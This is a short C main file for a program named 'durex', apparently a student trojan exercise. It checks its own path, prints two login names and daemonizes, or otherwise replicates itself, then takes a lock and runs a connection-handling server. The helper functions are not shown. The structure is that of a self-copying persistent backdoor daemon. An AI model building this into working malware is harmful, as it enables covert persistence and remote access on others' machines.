#include "durex.h"

t_daemon	g_durex;

int			main(void)
{
	signal_setup();
	if (checkpath() == -1)
	{
		write(1, "rludosan-nidzik\n", 16);
		daemonize();
	}
	else
		replicate();
	set_lock();
	server_create();
	server_handle_connections();
	server_destroy();
	unset_lock();
	return (0);
}
